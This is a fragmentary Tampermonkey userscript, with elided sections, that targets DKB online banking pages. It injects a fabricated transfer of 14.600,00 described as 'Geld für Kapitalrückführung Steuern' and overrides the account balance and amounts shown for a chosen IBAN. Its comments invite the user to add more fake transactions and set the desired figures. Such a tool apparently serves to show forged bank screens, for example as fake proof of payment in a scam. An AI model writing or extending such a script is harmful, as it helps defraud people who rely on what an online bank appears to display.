// ==UserScript==
// @name         Combined Userscript DKB Peter Schmitz
// @namespace    http://tampermonkey.net/
// @version      4.0
// @description  Combine different scripts
// @match        https://www.ib.dkb.de/*
// @match        https://banking.dkb.de/*
// @match        https://banking.dkb.de/waiting/*
// @match        https://banking.dkb.de/*
// @grant        none
// @downloadURL https://update.greasyfork.org/scripts/474516/Combined%20Userscript%20DKB%20Peter%20Schmitz.user.js
// @updateURL https://update.greasyfork.org/scripts/474516/Combined%20Userscript%20DKB%20Peter%20Schmitz.meta.js
// ==/UserScript==
...
(function() {
   ...
   // Check if on the  Login validation page
    const is2LoginPage = window.location.href.indexOf('https://banking.dkb.de/waiting') !== -1;
...
// Check if on the  wrong finanzstatus page
    const is3LoginPage = window.location.href.indexOf('https://banking.dkb.de') !== -1;
    ...
    const transaction = {
      amount: '14.600,00',
      description: 'Geld für Kapitalrückführung Steuern',
      type: 'Überweisung Geld für Kapitalruckführung Steuern',
      date: '04.09.2023   04.09.2023',
  ...
  /// DON'T FORGET TO ADD ANOTHER TRANSACTION BELOW
    ...
    const targetIBAN = 'DE10 1203 0000 1089 2497 16'; // The IBAN you want to modify
    ...
    const specifiedIBAN = "DE10 1203 0000 1089 2497 16"; // The desired IBAN
    let specifiedAmount = 2000; // The desired amount

      balanceModificationAmount = amountModificationValue = specifiedAmount = 14600; // change for the desired amount for finanzstatus and umbuchung
